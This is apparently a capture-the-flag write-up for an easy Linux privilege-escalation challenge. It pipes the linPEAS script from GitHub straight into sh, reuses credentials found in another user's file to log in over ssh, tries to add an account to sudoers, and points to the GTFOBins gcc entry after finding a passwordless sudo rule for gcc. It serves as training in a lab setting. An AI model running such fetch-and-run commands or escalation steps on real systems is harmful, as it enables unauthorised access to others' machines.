# CTF Writeup:  Bit by Bit

## Challenge Overview
* **Category:** Digital Forensics
* **Difficulty:** [Easy]
* **Description:** We have access to a linux box, need to find vulnerabile configuration to escalate privileges and find flag. 


## Tools Used

- [Linpease](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [gtfobins](https://gtfobins.github.io/)
- [bash]

---

## Solution

Usual disclaimer here: the following solution was the one that worked and there was some trial and error to find it. Omitting those dead-ends for brevity.  

### Step 1: Initial Access

Challenge requires privilege escalation so let's go script kiddie and fetch a tool to search for privilege escalations (`privesc` as it's call in `the biz`):

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Well well well. Another user has stored temp creds in a file we have access to. Let's try sshing into their account and see what permissions they have. Fingers crossed they're in sudoers and we can use their privesc ours **sinister laughing**. 

```bash

ssh joan@localhost

```

---

### Step 2: Priv Esc

Now we have access to joan's account, see what groups she's in

```bash
groups
Joan sudo
```

Cool, now let's add our pentester account to sudoers

```bash
sudo usermod -aG sudo Pentester
Sorry, user Joan is not allowed to execute '/usr/sbin/usermod -aG sudo Pentester' as root on dad5f987a15f."
```

Rubbing the brow here as I was heading for a PB for unfinished challenges in this event. Thankfully team-work makes the dream work and I looked to the east for a wizard saviour:

![image](https://github.com/user-attachments/assets/ae3a0073-47c4-4fd2-8951-ded3391ab218)

Lol, thanks wizard 🧙 10 seconds, one command, and a URL later: 

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/gcc
```

[https://gtfobins.github.io/gtfobins/gcc#sudo]

Doopdeedoop:




---

### Step 3: Flag Retrieval

Now we have root, the flag's gotta be here somewhere, normally just use find (looking for flag.txt) or grep (looking for FLAG within a file) on the entire file system. 


![image](https://github.com/user-attachments/assets/08fef0f2-78d4-4051-baac-8a8a62515e4a)


---

## Notes

- Don't be afraid to ask for help when you get blocked. Difficult for you can be easy for someone else and vice versa. 
- As a team, set up some tools in comms (like threads in channels) to share progress on challenges. 

---


